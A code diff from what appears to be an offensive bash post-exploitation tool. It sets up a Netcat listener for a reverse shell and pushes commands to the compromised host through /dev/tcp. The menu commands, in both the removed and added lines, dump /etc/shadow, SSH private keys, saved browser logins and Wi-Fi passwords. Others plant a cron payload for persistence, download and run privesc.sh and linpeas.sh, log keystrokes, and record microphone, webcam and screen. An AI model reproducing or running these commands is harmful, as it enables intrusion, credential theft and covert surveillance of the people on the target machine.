@@ -1864,10 +1864,9 @@ post_exploitation() {
     echo -e "${BLUE}[+] Post-Exploitation Menu:${NC}"
     read -p "Enter the port to listen on: " listen_port
     echo -e "${BLUE}Setting up Netcat listener on port $listen_port...${NC}"
-    
-    # Run Netcat listener in the background and capture the PID
-    nc -lvnp $listen_port &
-    nc_pid=$!
+
+    # Run Netcat listener in the background
+    x-terminal-emulator -e "bash -c 'nc -lvnp $listen_port > /tmp/nc_output.txt & nc_pid=$!; echo $nc_pid > /tmp/nc_pid.txt'" &
 
     # Wait for the reverse shell connection to be established
     sleep 3
@@ -1903,70 +1902,47 @@ post_exploitation() {
         read -p "Select an option: " post_option
 
         case $post_option in
-            1) send_command "gather_system_info_linux" ;;
-            2) send_command "enumerate_users_groups_linux" ;;
-            3) send_command "check_sudo_permissions_linux" ;;
-            4) send_command "search_sensitive_files_linux" ;;
-            5) send_command "network_information_linux" ;;
-            6) send_command "privilege_escalation_scripts_linux" ;;
-            7) send_command "persistence_methods_linux" ;;
-            8) send_command "extract_password_hashes_linux" ;;
-            9) send_command "keylogging_linux" ;;
-            10) send_command "exploit_suggester_linux" ;;
-            11) send_command "list_scheduled_tasks_linux" ;;
-            12) send_command "list_installed_software_linux" ;;
-            13) send_command "collect_browser_data_linux" ;;
-            14) send_command "dump_ssh_keys_linux" ;;
-            15) send_command "capture_screenshots_linux" ;;
-            16) send_command "monitor_network_traffic_linux" ;;
-            17) send_command "collect_wifi_passwords_linux" ;;
-            18) send_command "list_running_processes_linux" ;;
-            19) send_command "record_microphone_linux" ;;
-            20) send_command "webcam_capture_linux" ;;
-            21) send_command "check_virtual_machines_linux" ;;
-            22) send_command "extract_ssh_config_linux" ;;
-            23) send_command "extract_environment_variables_linux" ;;
-            24) send_command "list_open_files_linux" ;;
-            25) send_command "enumerate_installed_services_linux" ;;
+            1) send_command "uname -a && lsb_release -a" ;;
+            2) send_command "cat /etc/passwd && cat /etc/group" ;;
+            3) send_command "sudo -l" ;;
+            4) send_command "find / -type f -name '*password*'" ;;
+            5) send_command "ifconfig && netstat -an" ;;
+            6) send_command "wget -O /tmp/privesc.sh http://example.com/privesc.sh && bash /tmp/privesc.sh" ;;
+            7) send_command "crontab -l && echo '*/5 * * * * /path/to/payload' | crontab -" ;;
+            8) send_command "cat /etc/shadow" ;;
+            9) send_command "nohup /usr/bin/logger -t keylogger -p user.info $(xinput test-xi2 --root | grep --line-buffered RawKeyPress | sed 's/.*detail: //' | tr -d '[:blank:]' | tr '\n' ' ') &" ;;
+            10) send_command "wget -O /tmp/linpeas.sh http://example.com/linpeas.sh && bash /tmp/linpeas.sh" ;;
+            11) send_command "crontab -l && ls -al /etc/cron* && systemctl list-timers" ;;
+            12) send_command "dpkg -l || rpm -qa" ;;
+            13) send_command "find ~/.mozilla ~/.config/chromium -name '*.sqlite' -exec sqlite3 {} 'SELECT * FROM logins' \;" ;;
+            14) send_command "cat ~/.ssh/id_rsa" ;;
+            15) send_command "import -window root /tmp/screenshot.png && cat /tmp/screenshot.png" ;;
+            16) send_command "tcpdump -i any -w /tmp/traffic.pcap && cat /tmp/traffic.pcap" ;;
+            17) send_command "grep -r '^psk=' /etc/NetworkManager/system-connections/" ;;
+            18) send_command "ps aux" ;;
+            19) send_command "arecord -d 10 /tmp/audio.wav && cat /tmp/audio.wav" ;;
+            20) send_command "fswebcam -r 1280x720 --jpeg 85 -D 1 /tmp/webcam.jpg && cat /tmp/webcam.jpg" ;;
+            21) send_command "dmesg | grep -i virtual && lscpu | grep Hypervisor" ;;
+            22) send_command "cat /etc/ssh/sshd_config" ;;
+            23) send_command "printenv" ;;
+            24) send_command "lsof" ;;
+            25) send_command "systemctl list-units --type=service" ;;
             26) break ;;
             *) echo -e "${RED}Invalid option. Please try again.${NC}" ;;
         esac
+
+        # Display the output from the reverse shell
+        cat /tmp/nc_output.txt
     done
 
     # Kill Netcat listener after post-exploitation tasks are done
-    kill $nc_pid
+    kill $(cat /tmp/nc_pid.txt)
 }
 
 # Function to send command to the reverse shell
 send_command() {
     local cmd="$1"
-    case $cmd in
-        gather_system_info_linux) echo "uname -a && lsb_release -a" > /dev/tcp/10.10.79.46/$listen_port ;;
-        enumerate_users_groups_linux) echo "cat /etc/passwd && cat /etc/group" > /dev/tcp/10.10.79.46/$listen_port ;;
-        check_sudo_permissions_linux) echo "sudo -l" > /dev/tcp/10.10.79.46/$listen_port ;;
-        search_sensitive_files_linux) echo "find / -type f -name '*password*'" > /dev/tcp/10.10.79.46/$listen_port ;;
-        network_information_linux) echo "ifconfig && netstat -an" > /dev/tcp/10.10.79.46/$listen_port ;;
-        privilege_escalation_scripts_linux) echo "wget -O /tmp/privesc.sh http://example.com/privesc.sh && bash /tmp/privesc.sh" > /dev/tcp/10.10.79.46/$listen_port ;;
-        persistence_methods_linux) echo "crontab -l && echo '*/5 * * * * /path/to/payload' | crontab -" > /dev/tcp/10.10.79.46/$listen_port ;;
-        extract_password_hashes_linux) echo "cat /etc/shadow" > /dev/tcp/10.10.79.46/$listen_port ;;
-        keylogging_linux) echo "nohup /usr/bin/logger -t keylogger -p user.info $(xinput test-xi2 --root | grep --line-buffered RawKeyPress | sed 's/.*detail: //' | tr -d '[:blank:]' | tr '\n' ' ') &" > /dev/tcp/10.10.79.46/$listen_port ;;
-        exploit_suggester_linux) echo "wget -O /tmp/linpeas.sh http://example.com/linpeas.sh && bash /tmp/linpeas.sh" > /dev/tcp/10.10.79.46/$listen_port ;;
-        list_scheduled_tasks_linux) echo "crontab -l && ls -al /etc/cron* && systemctl list-timers" > /dev/tcp/10.10.79.46/$listen_port ;;
-        list_installed_software_linux) echo "dpkg -l || rpm -qa" > /dev/tcp/10.10.79.46/$listen_port ;;
-        collect_browser_data_linux) echo "find ~/.mozilla ~/.config/chromium -name '*.sqlite' -exec sqlite3 {} 'SELECT * FROM logins' \;" > /dev/tcp/10.10.79.46/$listen_port ;;
-        dump_ssh_keys_linux) echo "cat ~/.ssh/id_rsa" > /dev/tcp/10.10.79.46/$listen_port ;;
-        capture_screenshots_linux) echo "import -window root /tmp/screenshot.png && cat /tmp/screenshot.png" > /dev/tcp/10.10.79.46/$listen_port ;;
-        monitor_network_traffic_linux) echo "tcpdump -i any -w /tmp/traffic.pcap && cat /tmp/traffic.pcap" > /dev/tcp/10.10.79.46/$listen_port ;;
-        collect_wifi_passwords_linux) echo "grep -r '^psk=' /etc/NetworkManager/system-connections/" > /dev/tcp/10.10.79.46/$listen_port ;;
-        list_running_processes_linux) echo "ps aux" > /dev/tcp/10.10.79.46/$listen_port ;;
-        record_microphone_linux) echo "arecord -d 10 /tmp/audio.wav && cat /tmp/audio.wav" > /dev/tcp/10.10.79.46/$listen_port ;;
-        webcam_capture_linux) echo "fswebcam -r 1280x720 --jpeg 85 -D 1 /tmp/webcam.jpg && cat /tmp/webcam.jpg" > /dev/tcp/10.10.79.46/$listen_port ;;
-        check_virtual_machines_linux) echo "dmesg | grep -i virtual && lscpu | grep Hypervisor" > /dev/tcp/localhost/$listen_port ;;
-        extract_ssh_config_linux) echo "cat /etc/ssh/sshd_config" > /dev/tcp/10.10.79.46/$listen_port ;;
-        extract_environment_variables_linux) echo "printenv" > /dev/tcp/10.10.79.46/$listen_port ;;
-        list_open_files_linux) echo "lsof" > /dev/tcp/10.10.79.46/$listen_port ;;
-        enumerate_installed_services_linux) echo "systemctl list-units --type=service" > /dev/tcp/10.10.79.46/$listen_port ;;
-    esac
+    echo "$cmd" > /dev/tcp/localhost/$listen_port
 }
 
 check_install_dependencies() {
